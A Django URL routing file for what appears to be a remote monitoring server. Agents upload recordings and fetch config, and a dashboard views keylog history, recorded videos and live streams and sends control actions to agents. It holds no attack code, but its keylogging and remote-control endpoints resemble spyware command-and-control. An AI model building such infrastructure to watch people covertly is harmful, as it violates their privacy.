from django.urls import path
from . import views

urlpatterns = [
    path('live_streams/', views.live_streams_api_view, name='live_streams_api'),
    path('toggle_live_streaming/<str:agent_id>/', views.toggle_live_streaming_api_view, name='toggle_live_streaming'),
    path('live_streams/', views.live_streams_api_view, name='live_streams'),
    path('agent/<str:agent_id>/toggle_live_streaming/', views.toggle_live_streaming_api_view, name='toggle_live_streaming_api_alt'),
    # Agent-facing API endpoints
    path('config/', views.get_config_api, name='get_config_api'),
    path('upload_recording/', views.RecordingUploadAPIView.as_view(), name='upload_recording'),

    # Dashboard-facing API endpoints
    path('agents/status/', views.agent_status_api_view, name='agent_status'),
    path('agents/<str:agent_id>/config/', views.update_agent_config_api, name='update_agent_config'),
    path('agent/<str:agent_id>/update-config/', views.update_agent_config_api, name='update_agent_config_alt'),
    path('agents/<str:agent_id>/control/<str:action>/', views.agent_control_view, name='agent_control'),
    path('agents/broadcast_config/', views.broadcast_config_update, name='broadcast_config'),

    # Fix the URL patterns to match what the frontend expects
    path('data/history/', views.agent_data_history_api_view, name='agent_data_history'),
    path('agents/history/', views.agent_data_history_api_view, name='agent_history_alias'),  # Frontend expects this
    path('keylog/history/', views.keylog_history_api_view, name='keylog_history'),  # Frontend expects this
    path('keylogs/', views.keylog_history_api_view, name='keylog_history_alias'),
    path('recordings/videos/', views.recorded_video_list_api_view, name='recorded_videos'),  # Frontend expects this
    path('videos/', views.recorded_video_list_api_view, name='recorded_videos_alias'),
    path('live_streams/', views.live_stream_status_api_view, name='live_stream_status_api'),
]